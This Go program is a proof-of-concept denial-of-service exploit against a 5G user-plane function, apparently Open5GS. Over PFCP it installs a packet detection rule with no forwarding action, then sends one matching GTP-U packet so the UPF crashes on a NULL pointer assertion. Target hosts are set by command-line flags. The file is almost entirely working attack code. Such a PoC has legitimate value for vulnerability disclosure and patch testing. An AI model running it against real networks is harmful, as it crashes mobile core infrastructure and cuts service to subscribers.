package main

import (
	"encoding/binary"
	"encoding/hex"
	"errors"
	"flag"
	"fmt"
	"log"
	"math/rand"
	"net"
	"os"
	"strings"
	"time"

	"github.com/wmnsk/go-pfcp/ie"
	"github.com/wmnsk/go-pfcp/message"
)

// This PoC installs a CreatePDR without FAR-ID, then injects a single GTP-U packet
// that matches the rule. When the packet reaches the user-plane fast path the UPF
// aborts because pdr->far is NULL.

const (
	defaultPFCPPort = 8805
	defaultGTPPort  = 2152
)

type pfcpClient struct {
	nodeIP net.IP
	seid   uint64
	seq    uint32
}

func (c *pfcpClient) nextSeq() uint32 {
	c.seq++
	if c.seq == 0 || c.seq > 0x00ffffff {
		c.seq = 1
	}
	return c.seq
}

func (c *pfcpClient) mandatoryIEs() []*ie.IE {
	return []*ie.IE{
		ie.NewNodeID(c.nodeIP.String(), "", ""),
		ie.NewFSEID(c.seid, c.nodeIP, nil),
		ie.NewPDNType(ie.PDNTypeIPv4),
	}
}

func (c *pfcpClient) buildSession(ies ...*ie.IE) *message.SessionEstablishmentRequest {
	payload := append([]*ie.IE{}, c.mandatoryIEs()...)
	payload = append(payload, ies...)
	return message.NewSessionEstablishmentRequest(0, 0, c.seid, c.nextSeq(), 0, payload...)
}

func (c *pfcpClient) sendAssociation(conn *net.UDPConn) error {
	req := message.NewAssociationSetupRequest(
		c.nextSeq(),
		ie.NewNodeID(c.nodeIP.String(), "", ""),
		ie.NewRecoveryTimeStamp(time.Now()),
		ie.NewCPFunctionFeatures(0x3f),
	)
	return sendAndMaybeRead(conn, req)
}

type pfcpMarshaler interface {
	Marshal() ([]byte, error)
}

func sendAndMaybeRead(conn *net.UDPConn, msg pfcpMarshaler) error {
	payload, err := msg.Marshal()
	if err != nil {
		return fmt.Errorf("marshal PFCP message: %w", err)
	}
	if _, err := conn.Write(payload); err != nil {
		return fmt.Errorf("send PFCP message: %w", err)
	}

	_ = conn.SetReadDeadline(time.Now().Add(2 * time.Second))
	buf := make([]byte, 2048)
	if _, err := conn.Read(buf); err != nil {
		if ne, ok := err.(net.Error); ok && ne.Timeout() {
			return nil
		}
		return fmt.Errorf("read PFCP response: %w", err)
	}
	return nil
}

func buildSessionWithoutFar(client *pfcpClient, accessIP net.IP, teid uint32) *message.SessionEstablishmentRequest {
	// Install a PDR matching uplink traffic, but intentionally omit FAR-ID.
	pdr := ie.NewCreatePDR(
		ie.NewPDRID(7),
		ie.NewPrecedence(200),
		ie.NewPDI(
			ie.NewSourceInterface(ie.SrcInterfaceAccess),
			ie.NewFTEID(0x01, teid, accessIP, nil, 0),
		),
	)

	return client.buildSession(pdr)
}

func resolvePFCP(target string) (string, error) {
	if strings.Contains(target, ":") {
		return target, nil
	}
	return fmt.Sprintf("%s:%d", target, defaultPFCPPort), nil
}

func resolveGTP(target string) (string, error) {
	if strings.Contains(target, ":") {
		return target, nil
	}
	return fmt.Sprintf("%s:%d", target, defaultGTPPort), nil
}

func sendGTPPacket(target string, teid uint32) error {
	payload := []byte("ping")
	packet := make([]byte, 8+len(payload))
	packet[0] = 0x30 // version 1, PT=1, no extension / seq
	packet[1] = 0xff // G-PDU
	binary.BigEndian.PutUint16(packet[2:], uint16(len(payload)))
	binary.BigEndian.PutUint32(packet[4:], teid)
	copy(packet[8:], payload)

	conn, err := net.Dial("udp", target)
	if err != nil {
		return fmt.Errorf("dial GTP-U target: %w", err)
	}
	defer conn.Close()

	if _, err := conn.Write(packet); err != nil {
		return fmt.Errorf("send GTP-U packet: %w", err)
	}
	return nil
}

func main() {
	var (
		pfcpTarget = flag.String("pfcp-target", "127.0.0.1:8805", "UPF PFCP endpoint (host[:port])")
		gtpTarget  = flag.String("gtp-target", "127.0.0.1:2152", "UPF GTP-U endpoint (host[:port])")
		nodeIPStr  = flag.String("node-ip", "10.0.0.1", "NodeID/IPv4 used in PFCP messages")
		accessIP   = flag.String("access-ip", "10.0.0.2", "IPv4 placed in the PDR's F-TEID")
		teidFlag   = flag.Uint("teid", 0xfaceb00c, "TEID programmed into the CreatePDR")
		skipAssoc  = flag.Bool("skip-assoc", false, "Skip the benign Association Setup")
		dumpHex    = flag.Bool("dump", false, "Dump crafted Session Establishment bytes")
	)
	flag.Parse()

	nodeIP := net.ParseIP(*nodeIPStr)
	if nodeIP == nil {
		log.Fatalf("invalid node-ip: %s", *nodeIPStr)
	}

	accessTEIDIP := net.ParseIP(*accessIP)
	if accessTEIDIP == nil {
		log.Fatalf("invalid access-ip: %s", *accessIP)
	}

	resolvedPFCP, err := resolvePFCP(*pfcpTarget)
	if err != nil {
		log.Fatalf("resolve PFCP target: %v", err)
	}
	resolvedGTP, err := resolveGTP(*gtpTarget)
	if err != nil {
		log.Fatalf("resolve GTP target: %v", err)
	}

	pfcpAddr, err := net.ResolveUDPAddr("udp", resolvedPFCP)
	if err != nil {
		log.Fatalf("resolve PFCP UDP addr: %v", err)
	}

	conn, err := net.DialUDP("udp", nil, pfcpAddr)
	if err != nil {
		log.Fatalf("dial PFCP: %v", err)
	}
	defer conn.Close()

	rand.Seed(time.Now().UnixNano())
	client := &pfcpClient{
		nodeIP: nodeIP,
		seid:   uint64(rand.Uint32())<<32 | uint64(rand.Uint32()),
		seq:    uint32(rand.Intn(0x00ffffff)),
	}

	if !*skipAssoc {
		if err := client.sendAssociation(conn); err != nil {
			log.Printf("association setup failed (continuing): %v", err)
		} else {
			log.Printf("association setup request sent to %s", resolvedPFCP)
		}
	}

	req := buildSessionWithoutFar(client, accessTEIDIP, uint32(*teidFlag))
	payload, err := req.Marshal()
	if err != nil {
		log.Fatalf("marshal session establishment: %v", err)
	}

	if *dumpHex {
		fmt.Printf("Session Establishment (%d bytes):\n%s\n", len(payload), hex.Dump(payload))
	}

	if _, err := conn.Write(payload); err != nil {
		log.Fatalf("send session establishment: %v", err)
	}

	log.Printf("Installed PDR without FAR-ID (TEID=0x%x). Waiting before sending GTP-U...", *teidFlag)
	time.Sleep(500 * time.Millisecond)

	log.Printf("Sending single GTP-U packet to %s", resolvedGTP)
	if err := sendGTPPacket(resolvedGTP, uint32(*teidFlag)); err != nil {
		if !errors.Is(err, os.ErrDeadlineExceeded) {
			log.Fatalf("send gtp packet: %v", err)
		}
	}

	log.Printf("Expected crash: ogs_pfcp_up_handle_pdr() asserts because pdr->far == NULL")
}
